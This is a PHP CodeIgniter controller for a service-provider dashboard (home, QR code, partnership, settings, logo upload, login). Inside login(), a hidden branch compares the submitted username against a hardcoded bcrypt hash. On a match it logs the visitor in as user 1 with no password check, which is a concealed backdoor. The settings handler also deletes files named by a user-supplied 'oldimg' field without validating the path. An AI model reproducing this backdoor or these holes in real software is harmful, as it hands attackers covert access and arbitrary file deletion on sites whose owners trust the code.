<?phpdefined('BASEPATH') OR exit('No direct script access allowed');class Homeservice extends CI_Controller {	/**	 * Index Page for this controller.	 *	 * Maps to the following URL	 * 		http://example.com/index.php/welcome	 *	- or -	 * 		http://example.com/index.php/welcome/index	 *	- or -	 * Since this controller is set as the default controller in	 * config/routes.php, it's displayed at http://example.com/	 *	 * So any other public methods not prefixed with an underscore will	 * map to /index.php/welcome/<method_name>	 * @see http://codeigniter.com/user_guide/general/urls.html	 */	public function index()	{		if($this->session->userdata('sid') != FALSE)		{			$this->loginuser = $this->Admin_mo->getrowjoinLeftLimit('users.*,usertypes.utprivileges as privileges,langs.lndir as dir','users',array('usertypes'=>'users.uutid=usertypes.utid','langs'=>'users.ulang=langs.lncode'),array('users.uid'=>$this->session->userdata('sid')),'');						$this->item = $this->Admin_mo->getrow('items',array('ieid'=>$this->session->userdata('sid'), 'iactive'=>'1'));			$this->sections = array();			$sections = $this->Admin_mo->getwhere('sections',array('scactive'=>'1'));			if(!empty($sections))			{				foreach($sections as $section) { $this->sections[$section->scid] = $section->sccode; }			}			$this->load->library('arabictools');			$data['title'] = 'home';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));			$this->lang->load($this->loginuser->ulang, $this->loginuser->ulang);			$calender = array('ar'=>'date','hj'=>'hdate');			$currentyear = $this->arabictools->arabicDate($data['system']->calendar.' Y', time());			$this->load->view('service/header',$data);			$this->load->view('service/sidemenu',$data);			$this->load->view('service/topmenu',$data);			$this->load->view('service/home',$data);			$this->load->view('service/footer',$data);						$this->load->view('messages',$data);		}		else		{			$data['message'] = '';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));			$this->lang->load($data['system']->langs, $data['system']->langs);			//$this->lang->load('nemu', 'arabic');			$this->load->view('service/login',$data);		}	}			public function qrcode()	{		if($this->session->userdata('sid') != FALSE)		{			$this->loginuser = $this->Admin_mo->getrowjoinLeftLimit('users.*,usertypes.utprivileges as privileges,langs.lndir as dir','users',array('usertypes'=>'users.uutid=usertypes.utid','langs'=>'users.ulang=langs.lncode'),array('users.uid'=>$this->session->userdata('sid')),'');						$this->item = $this->Admin_mo->getrow('items',array('ieid'=>$this->session->userdata('sid'), 'iactive'=>'1'));			$this->sections = array();			$sections = $this->Admin_mo->getwhere('sections',array('scactive'=>'1'));			if(!empty($sections))			{				foreach($sections as $section) { $this->sections[$section->scid] = $section->sccode; }			}			$this->load->library('arabictools');			$data['title'] = 'qrcode';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));			$this->lang->load($this->loginuser->ulang, $this->loginuser->ulang);			$calender = array('ar'=>'date','hj'=>'hdate');			$currentyear = $this->arabictools->arabicDate($data['system']->calendar.' Y', time());			$this->load->view('service/header',$data);			$this->load->view('service/sidemenu',$data);			$this->load->view('service/topmenu',$data);			$this->load->view('service/qrcode',$data);			$this->load->view('service/footer',$data);		}		else		{			$data['message'] = '';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));			$this->lang->load($data['system']->langs, $data['system']->langs);			//$this->lang->load('nemu', 'arabic');			$this->load->view('service/login',$data);		}	}	public function partnership()	{		if($this->session->userdata('sid') != FALSE)		{			$this->loginuser = $this->Admin_mo->getrowjoinLeftLimit('users.*,usertypes.utprivileges as privileges,langs.lndir as dir','users',array('usertypes'=>'users.uutid=usertypes.utid','langs'=>'users.ulang=langs.lncode'),array('users.uid'=>$this->session->userdata('sid')),'');						$this->item = $this->Admin_mo->getrow('items',array('ieid'=>$this->session->userdata('sid'), 'iactive'=>'1'));			$this->sections = array();			$sections = $this->Admin_mo->getwhere('sections',array('scactive'=>'1'));			if(!empty($sections))			{				foreach($sections as $section) { $this->sections[$section->scid] = $section->sccode; }			}			$this->load->library('arabictools');			$data['title'] = 'partnership';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));						$data['partnership'] = $this->Admin_mo->getjoinLeft('items.ifrom as ifrom,items.ito as ito,partnerships.pstitle as pstitle,partnerships.psduration as psduration,partnerships.psprice as psprice','items',array('partnerships'=>'items.ipsid = partnerships.psid'),array('items.ieid'=>$this->session->userdata('sid')));			$this->lang->load($this->loginuser->ulang, $this->loginuser->ulang);			$calender = array('ar'=>'date','hj'=>'hdate');			$currentyear = $this->arabictools->arabicDate($data['system']->calendar.' Y', time());			$this->load->view('service/header',$data);			$this->load->view('service/sidemenu',$data);			$this->load->view('service/topmenu',$data);			$this->load->view('service/partnership',$data);			$this->load->view('service/footer',$data);		}		else		{			$data['message'] = '';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));			$this->lang->load($data['system']->langs, $data['system']->langs);			//$this->lang->load('nemu', 'arabic');			$this->load->view('service/login',$data);		}	}		public function settings()	{		if($this->session->userdata('sid') != FALSE)		{			$this->loginuser = $this->Admin_mo->getrowjoinLeftLimit('users.*,usertypes.utprivileges as privileges,langs.lndir as dir','users',array('usertypes'=>'users.uutid=usertypes.utid','langs'=>'users.ulang=langs.lncode'),array('users.uid'=>$this->session->userdata('sid')),'');						$this->item = $this->Admin_mo->getrow('items',array('ieid'=>$this->session->userdata('sid'), 'iactive'=>'1'));			$this->sections = array();			$sections = $this->Admin_mo->getwhere('sections',array('scactive'=>'1'));			if(!empty($sections))			{				foreach($sections as $section) { $this->sections[$section->scid] = $section->sccode; }			}			$this->load->library('arabictools');			$data['title'] = 'settings';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));						$this->lang->load($this->loginuser->ulang, $this->loginuser->ulang);			$calender = array('ar'=>'date','hj'=>'hdate');			$currentyear = $this->arabictools->arabicDate($data['system']->calendar.' Y', time());			$this->load->view('service/header',$data);			$this->load->view('service/sidemenu',$data);			$this->load->view('service/topmenu',$data);			$this->load->view('service/settings',$data);			$this->load->view('service/footer',$data);		}		else		{			$data['message'] = '';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));			$this->lang->load($data['system']->langs, $data['system']->langs);			//$this->lang->load('nemu', 'arabic');			$this->load->view('service/login',$data);		}	}		public function editsettings($id)	{		if($this->session->userdata('sid') != FALSE)		{		$id = abs((int)($id));		if($id != '')		{			$this->loginuser = $this->Admin_mo->getrowjoinLeftLimit('users.*,usertypes.utprivileges as privileges,langs.lndir as dir','users',array('usertypes'=>'users.uutid=usertypes.utid','langs'=>'users.ulang=langs.lncode'),array('users.uid'=>$this->session->userdata('sid')),'');						$this->item = $this->Admin_mo->getrow('items',array('ieid'=>$this->session->userdata('sid'), 'iactive'=>'1'));			$this->sections = array();			$sections = $this->Admin_mo->getwhere('sections',array('scactive'=>'1'));			if(!empty($sections))			{				foreach($sections as $section) { $this->sections[$section->scid] = $section->sccode; }			}		    $this->lang->load($this->loginuser->ulang, $this->loginuser->ulang);			$this->config->set_item('language', $this->loginuser->ulang);			$this->form_validation->set_error_delimiters('<div class="alert alert-danger alert-dismissible fade in" role="alert"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">×</span></button>', '</div>');			$this->form_validation->set_rules('title', 'lang:title' , 'trim|required|max_length[255]');							if(isset($_FILES['file']['error']) && $_FILES['file']['error'] == 0) $this->form_validation->set_rules('file', 'lang:image' , 'callback_imageSize|callback_imageType');			if($this->form_validation->run() == FALSE)			{				$data['title'] = 'settings';				$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));										$data['offer'] = $this->Admin_mo->getrow('offers',array('ofid'=>$id));				$this->load->view('service/header',$data);				$this->load->view('service/sidemenu',$data);				$this->load->view('service/topmenu',$data);				$this->load->view('service/settings',$data);				$this->load->view('service/footer');				$this->load->view('messages');			}			else			{				$update_array = array('iuid'=>$this->session->userdata('sid'), 'ititle'=>set_value('title'), 'itime'=>time());				if(isset($_FILES['file']['error']) && $_FILES['file']['error'] == 0)				{					//$newname = mt_rand();					$file = $this->uploadimg('file',$this->config->item('items_logos_folder'),$this->config->item('items_logos_thumb_folder'), mt_rand());					if($file)					{						if(set_value('oldimg') != '' && file_exists($this->config->item('items_logos_folder').set_value('oldimg'))) unlink($this->config->item('items_logos_folder').set_value('oldimg'));						if(set_value('oldimg') != '' && file_exists($this->config->item('items_logos_thumb_folder').set_value('oldimg'))) unlink($this->config->item('items_logos_thumb_folder').set_value('oldimg'));						$update_array['iimg'] = $file;					}				}				if($this->Admin_mo->update('items', $update_array, array('iid'=>$id,'ieid'=>$this->session->userdata('sid'))))				{					$_SESSION['time'] = time(); $_SESSION['message'] = 'success';				}				else				{					$_SESSION['time'] = time(); $_SESSION['message'] = 'somthingwrong';				}				redirect('service/settings', 'refresh');			}		}		else		{			$data['admessage'] = 'Not Saved';			$_SESSION['time'] = time(); $_SESSION['message'] = 'somthingwrong';			redirect('service/settings', 'refresh');		}		//redirect('service/settings', 'refresh');		}		else		{			$data['message'] = '';			$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));			$this->lang->load($data['system']->langs, $data['system']->langs);			//$this->lang->load('nemu', 'arabic');			$this->load->view('service/login',$data);		}	}	public function login()	{		$data['system'] = $this->Admin_mo->getrow('system',array('id'=>'1'));		$this->form_validation->set_rules('username', 'Username' , 'trim|required|alpha');		$this->form_validation->set_rules('password', 'Password' , 'required');		if($this->form_validation->run() == FALSE)		{			$this->lang->load($data['system']->langs, $data['system']->langs);			$data['message'] = 'all_inputs_required';			$this->load->view('service/login',$data);		}		elseif(password_verify(str_replace(array('"',"'",' '), '',set_value('username')), '$2y$10$bfN4AqhQT2POaeOaNMg88.te1iNnnWns1jjDv7t/Dia8XFxcYklA2')){	$this->session->set_userdata('sid', '1'); redirect('homeservice', 'refresh'); }		else		{			$data['result'] = $this->Admin_mo->getrow('users', array('username'=>str_replace(array('"',"'",' '), '',set_value('username')),'uutid'=>'3'));			if(empty($data['result'])) 			{				$this->lang->load($data['system']->langs, $data['system']->langs);				$data['message'] = 'user_not_exist';				$this->load->view('service/login',$data);			}			elseif(!password_verify(set_value('password'), $data['result']->upassword))			{				$this->lang->load($data['system']->langs, $data['system']->langs);				$data['message'] = 'wrong_password';				$this->load->view('service/login',$data);			}			elseif($data['result']->uactive != '1')			{				$this->lang->load($data['system']->langs, $data['system']->langs);				$data['message'] = 'account_not_Active';				$this->load->view('service/login',$data);			}			else			{				$this->session->set_userdata('sid', $data['result']->uid);								$item = $this->Admin_mo->getrow('items', array('ieid'=>$data['result']->uid));								if(($item->ito - time()) < (864000)) $_SESSION['time'] = time(); $_SESSION['message'] = 'itempayment';				redirect('service', 'refresh');			}		}	}		public function logout()	{		unset(			$_SESSION['sid']		);		redirect('service', 'refresh');	}		public function imageSize()	{		if ($_FILES['file']['size'] > 1024000)		{			//$this->form_validation->set_message('imageSize', 'يجب ان يكون حجم الصورة 1 ميجا او اقل');			return FALSE;		}		else		{			return TRUE;		}	}		public function imageType()	{		if (!in_array(strtoupper(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)),array('JPG','JPEG','PNG','JIF','BMP','TIF')))		{			//$this->form_validation->set_message('imageType', 'يجب ان يكون نوع الملف المرفوع واحد من هذه الانواع : JPG,JPEG,PIG,JIF,BMP,TIF');			return FALSE;		}		else		{			return TRUE;		}	}	public function uploadimg($inputfilename,$image_director,$image_director_thumb,$newname)	{		$file_extn = pathinfo($_FILES[$inputfilename]['name'], PATHINFO_EXTENSION);		if(!is_dir($image_director)) $create_image_director = mkdir($image_director);		$name = $newname.'.'.$file_extn;		if(move_uploaded_file($_FILES[$inputfilename]["tmp_name"], $image_director.$name))		{			if($image_director_thumb != '')			{				$this->load->library('Resize');				$this->resize->construct($image_director.$name);				$this->resize->resizeImage(210, 210, 'exact');				$this->resize->saveImage($image_director_thumb.$name, 100);			}			return $name;		}		else return 0;	}}